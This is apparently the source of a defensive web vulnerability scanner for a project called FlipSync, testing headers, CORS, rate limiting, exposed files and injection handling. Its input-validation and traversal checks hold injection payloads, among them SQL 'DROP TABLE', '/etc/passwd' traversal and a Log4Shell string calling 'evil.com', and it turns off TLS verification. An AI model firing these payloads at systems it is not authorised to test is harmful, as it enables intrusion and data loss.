"""
FlipSync Security Vulnerability Scanner
Automated security scanning for production readiness
"""

import asyncio
import json
import logging
import re
import ssl
import subprocess
import time
from datetime import datetime
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse

import aiohttp
import requests
from pydantic import BaseModel

logger = logging.getLogger(__name__)


class VulnerabilityReport(BaseModel):
    """Vulnerability scan report."""

    scan_id: str
    timestamp: datetime
    target_url: str
    scan_duration: float
    total_checks: int
    vulnerabilities_found: int
    critical_issues: int
    high_issues: int
    medium_issues: int
    low_issues: int
    info_issues: int
    vulnerabilities: List[Dict[str, Any]]
    recommendations: List[str]
    overall_score: float  # 0-100, higher is better


class SecurityScanner:
    """Comprehensive security vulnerability scanner."""

    def __init__(self, base_url: str, api_key: Optional[str] = None):
        self.base_url = base_url.rstrip("/")
        self.api_key = api_key
        self.session = None
        self.vulnerabilities = []
        self.recommendations = []

    async def scan(self) -> VulnerabilityReport:
        """Run comprehensive security scan."""
        scan_id = f"scan_{int(time.time())}"
        start_time = time.time()

        logger.info(f"Starting security scan {scan_id} for {self.base_url}")

        # Initialize session
        self.session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=30),
            connector=aiohttp.TCPConnector(
                ssl=False
            ),  # Allow self-signed certs for testing
        )

        try:
            # Run all security checks
            await self._check_ssl_tls()
            await self._check_security_headers()
            await self._check_authentication()
            await self._check_cors_configuration()
            await self._check_rate_limiting()
            await self._check_input_validation()
            await self._check_information_disclosure()
            await self._check_common_vulnerabilities()
            await self._check_api_security()

            # Calculate metrics
            scan_duration = time.time() - start_time
            total_checks = 9  # Number of check categories

            # Categorize vulnerabilities by severity
            critical = len(
                [v for v in self.vulnerabilities if v.get("severity") == "CRITICAL"]
            )
            high = len([v for v in self.vulnerabilities if v.get("severity") == "HIGH"])
            medium = len(
                [v for v in self.vulnerabilities if v.get("severity") == "MEDIUM"]
            )
            low = len([v for v in self.vulnerabilities if v.get("severity") == "LOW"])
            info = len([v for v in self.vulnerabilities if v.get("severity") == "INFO"])

            # Calculate overall security score
            overall_score = self._calculate_security_score(critical, high, medium, low)

            report = VulnerabilityReport(
                scan_id=scan_id,
                timestamp=datetime.now(),
                target_url=self.base_url,
                scan_duration=scan_duration,
                total_checks=total_checks,
                vulnerabilities_found=len(self.vulnerabilities),
                critical_issues=critical,
                high_issues=high,
                medium_issues=medium,
                low_issues=low,
                info_issues=info,
                vulnerabilities=self.vulnerabilities,
                recommendations=self.recommendations,
                overall_score=overall_score,
            )

            logger.info(
                f"Security scan {scan_id} completed. Score: {overall_score}/100"
            )
            return report

        finally:
            if self.session:
                await self.session.close()

    async def _check_ssl_tls(self):
        """Check SSL/TLS configuration."""
        logger.info("Checking SSL/TLS configuration...")

        try:
            # Check if HTTPS is enforced
            http_url = self.base_url.replace("https://", "http://")
            async with self.session.get(http_url, allow_redirects=False) as response:
                if response.status != 301 and response.status != 302:
                    self._add_vulnerability(
                        "HTTPS Not Enforced",
                        "HIGH",
                        "HTTP requests are not redirected to HTTPS",
                        "Configure HTTPS redirect middleware",
                    )
        except Exception as e:
            logger.debug(f"HTTP check failed: {e}")

        # Check SSL certificate
        try:
            parsed_url = urlparse(self.base_url)
            if parsed_url.scheme == "https":
                context = ssl.create_default_context()
                with ssl.create_connection((parsed_url.hostname, 443)) as sock:
                    with context.wrap_socket(
                        sock, server_hostname=parsed_url.hostname
                    ) as ssock:
                        cert = ssock.getpeercert()

                        # Check certificate expiry
                        not_after = datetime.strptime(
                            cert["notAfter"], "%b %d %H:%M:%S %Y %Z"
                        )
                        days_until_expiry = (not_after - datetime.now()).days

                        if days_until_expiry < 30:
                            self._add_vulnerability(
                                "SSL Certificate Expiring Soon",
                                "MEDIUM",
                                f"Certificate expires in {days_until_expiry} days",
                                "Renew SSL certificate",
                            )
        except Exception as e:
            self._add_vulnerability(
                "SSL Certificate Issue",
                "HIGH",
                f"SSL certificate validation failed: {str(e)}",
                "Fix SSL certificate configuration",
            )

    async def _check_security_headers(self):
        """Check security headers."""
        logger.info("Checking security headers...")

        try:
            async with self.session.get(f"{self.base_url}/health") as response:
                headers = response.headers

                # Required security headers
                required_headers = {
                    "Strict-Transport-Security": "HSTS not configured",
                    "X-Content-Type-Options": "Content type sniffing protection missing",
                    "X-Frame-Options": "Clickjacking protection missing",
                    "X-XSS-Protection": "XSS protection missing",
                    "Content-Security-Policy": "Content Security Policy missing",
                    "Referrer-Policy": "Referrer policy missing",
                }

                for header, description in required_headers.items():
                    if header not in headers:
                        self._add_vulnerability(
                            f"Missing Security Header: {header}",
                            "MEDIUM",
                            description,
                            f"Add {header} security header",
                        )

                # Check for information disclosure headers
                disclosure_headers = ["Server", "X-Powered-By", "X-AspNet-Version"]
                for header in disclosure_headers:
                    if header in headers:
                        self._add_vulnerability(
                            f"Information Disclosure: {header}",
                            "LOW",
                            f"Server information disclosed in {header} header",
                            f"Remove or obfuscate {header} header",
                        )

        except Exception as e:
            logger.error(f"Security headers check failed: {e}")

    async def _check_authentication(self):
        """Check authentication security."""
        logger.info("Checking authentication security...")

        # Test authentication endpoints
        auth_endpoints = ["/api/v1/auth/login", "/auth/login", "/login"]

        for endpoint in auth_endpoints:
            try:
                url = f"{self.base_url}{endpoint}"

                # Test for timing attacks
                start_time = time.time()
                async with self.session.post(
                    url,
                    json={
                        "email": "nonexistent@example.com",
                        "password": "wrongpassword",
                    },
                ) as response:
                    response_time = time.time() - start_time

                # Check for information disclosure in error messages
                if response.status == 200:
                    text = await response.text()
                    if (
                        "user not found" in text.lower()
                        or "invalid user" in text.lower()
                    ):
                        self._add_vulnerability(
                            "UnifiedUsername Enumeration",
                            "MEDIUM",
                            "Authentication endpoint reveals whether user exists",
                            "Use generic error messages for authentication failures",
                        )

                # Test rate limiting on auth endpoints
                await self._test_auth_rate_limiting(url)

            except Exception as e:
                logger.debug(f"Auth endpoint {endpoint} check failed: {e}")

    async def _test_auth_rate_limiting(self, url: str):
        """Test rate limiting on authentication endpoints."""
        try:
            # Send multiple rapid requests
            tasks = []
            for i in range(10):
                task = self.session.post(
                    url,
                    json={"email": f"test{i}@example.com", "password": "wrongpassword"},
                )
                tasks.append(task)

            responses = await asyncio.gather(*tasks, return_exceptions=True)

            # Check if any requests were rate limited
            rate_limited = any(
                hasattr(r, "status") and r.status == 429
                for r in responses
                if not isinstance(r, Exception)
            )

            if not rate_limited:
                self._add_vulnerability(
                    "Insufficient Rate Limiting",
                    "HIGH",
                    "Authentication endpoint lacks proper rate limiting",
                    "Implement rate limiting on authentication endpoints",
                )

        except Exception as e:
            logger.debug(f"Rate limiting test failed: {e}")

    async def _check_cors_configuration(self):
        """Check CORS configuration."""
        logger.info("Checking CORS configuration...")

        try:
            # Test CORS with malicious origin
            headers = {"Origin": "https://evil.com"}
            async with self.session.options(
                f"{self.base_url}/api/v1/health", headers=headers
            ) as response:
                cors_origin = response.headers.get("Access-Control-Allow-Origin")

                if cors_origin == "*":
                    self._add_vulnerability(
                        "Overly Permissive CORS",
                        "HIGH",
                        "CORS allows all origins (*)",
                        "Configure specific allowed origins for CORS",
                    )
                elif cors_origin == "https://evil.com":
                    self._add_vulnerability(
                        "CORS Origin Reflection",
                        "HIGH",
                        "CORS reflects arbitrary origins",
                        "Validate CORS origins against whitelist",
                    )

        except Exception as e:
            logger.debug(f"CORS check failed: {e}")

    async def _check_rate_limiting(self):
        """Check rate limiting implementation."""
        logger.info("Checking rate limiting...")

        try:
            # Test general rate limiting
            url = f"{self.base_url}/api/v1/health"

            # Send rapid requests
            tasks = [self.session.get(url) for _ in range(20)]
            responses = await asyncio.gather(*tasks, return_exceptions=True)

            # Check for rate limiting
            rate_limited = any(
                hasattr(r, "status") and r.status == 429
                for r in responses
                if not isinstance(r, Exception)
            )

            if not rate_limited:
                self._add_vulnerability(
                    "No Rate Limiting",
                    "MEDIUM",
                    "API endpoints lack rate limiting protection",
                    "Implement rate limiting middleware",
                )

        except Exception as e:
            logger.debug(f"Rate limiting check failed: {e}")

    async def _check_input_validation(self):
        """Check input validation."""
        logger.info("Checking input validation...")

        # Test common injection payloads
        payloads = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "<%=7*7%>",
        ]

        test_endpoints = ["/api/v1/inventory", "/api/v1/users"]

        for endpoint in test_endpoints:
            for payload in payloads:
                try:
                    url = f"{self.base_url}{endpoint}"
                    data = {"test": payload, "name": payload}

                    async with self.session.post(url, json=data) as response:
                        response_text = await response.text()

                        # Check if payload is reflected without encoding
                        if payload in response_text and response.status != 400:
                            self._add_vulnerability(
                                "Insufficient Input Validation",
                                "HIGH",
                                f"Malicious input not properly validated: {payload[:50]}",
                                "Implement comprehensive input validation and sanitization",
                            )
                            break  # Don't report multiple times for same endpoint

                except Exception as e:
                    logger.debug(f"Input validation test failed: {e}")

    async def _check_information_disclosure(self):
        """Check for information disclosure."""
        logger.info("Checking for information disclosure...")

        # Test common disclosure endpoints
        disclosure_endpoints = [
            "/.env",
            "/config.json",
            "/package.json",
            "/composer.json",
            "/requirements.txt",
            "/Dockerfile",
            "/docker-compose.yml",
            "/.git/config",
            "/admin",
            "/debug",
            "/test",
        ]

        for endpoint in disclosure_endpoints:
            try:
                url = f"{self.base_url}{endpoint}"
                async with self.session.get(url) as response:
                    if response.status == 200:
                        self._add_vulnerability(
                            f"Information Disclosure: {endpoint}",
                            "MEDIUM",
                            f"Sensitive file accessible: {endpoint}",
                            f"Remove or protect access to {endpoint}",
                        )

            except Exception as e:
                logger.debug(f"Disclosure check for {endpoint} failed: {e}")

    async def _check_common_vulnerabilities(self):
        """Check for common web vulnerabilities."""
        logger.info("Checking for common vulnerabilities...")

        # Test for directory traversal
        try:
            url = f"{self.base_url}/api/v1/files/../../../etc/passwd"
            async with self.session.get(url) as response:
                if response.status == 200:
                    text = await response.text()
                    if "root:" in text:
                        self._add_vulnerability(
                            "Directory Traversal",
                            "CRITICAL",
                            "Directory traversal vulnerability detected",
                            "Implement proper path validation",
                        )
        except Exception as e:
            logger.debug(f"Directory traversal check failed: {e}")

    async def _check_api_security(self):
        """Check API-specific security."""
        logger.info("Checking API security...")

        # Test for API versioning
        try:
            async with self.session.get(f"{self.base_url}/api") as response:
                if response.status == 200:
                    text = await response.text()
                    if "v1" not in text and "version" not in text.lower():
                        self._add_vulnerability(
                            "API Versioning Missing",
                            "LOW",
                            "API lacks proper versioning",
                            "Implement API versioning strategy",
                        )
        except Exception as e:
            logger.debug(f"API versioning check failed: {e}")

    def _add_vulnerability(
        self, title: str, severity: str, description: str, recommendation: str
    ):
        """Add a vulnerability to the report."""
        vulnerability = {
            "title": title,
            "severity": severity,
            "description": description,
            "recommendation": recommendation,
            "timestamp": datetime.now().isoformat(),
        }
        self.vulnerabilities.append(vulnerability)

        if recommendation not in self.recommendations:
            self.recommendations.append(recommendation)

        logger.warning(f"Vulnerability found: {title} ({severity})")

    def _calculate_security_score(
        self, critical: int, high: int, medium: int, low: int
    ) -> float:
        """Calculate overall security score (0-100)."""
        # Weighted scoring system
        penalty = (critical * 25) + (high * 10) + (medium * 5) + (low * 2)
        score = max(0, 100 - penalty)
        return round(score, 1)


async def run_security_scan(
    base_url: str, api_key: Optional[str] = None
) -> VulnerabilityReport:
    """Run a comprehensive security scan."""
    scanner = SecurityScanner(base_url, api_key)
    return await scanner.scan()


def generate_security_report(
    report: VulnerabilityReport, output_file: str = None
) -> str:
    """Generate a formatted security report."""
    report_text = f"""
# FlipSync Security Vulnerability Report

**Scan ID:** {report.scan_id}
**Target:** {report.target_url}
**Timestamp:** {report.timestamp}
**Duration:** {report.scan_duration:.2f} seconds
**Overall Security Score:** {report.overall_score}/100

## Summary
- **Total Checks:** {report.total_checks}
- **Vulnerabilities Found:** {report.vulnerabilities_found}
- **Critical Issues:** {report.critical_issues}
- **High Issues:** {report.high_issues}
- **Medium Issues:** {report.medium_issues}
- **Low Issues:** {report.low_issues}
- **Info Issues:** {report.info_issues}

## Vulnerabilities
"""

    for vuln in report.vulnerabilities:
        report_text += f"""
### {vuln['title']} ({vuln['severity']})
**Description:** {vuln['description']}
**Recommendation:** {vuln['recommendation']}
"""

    report_text += f"""
## Recommendations
"""
    for i, rec in enumerate(report.recommendations, 1):
        report_text += f"{i}. {rec}\n"

    if output_file:
        with open(output_file, "w") as f:
            f.write(report_text)
        logger.info(f"Security report saved to {output_file}")

    return report_text
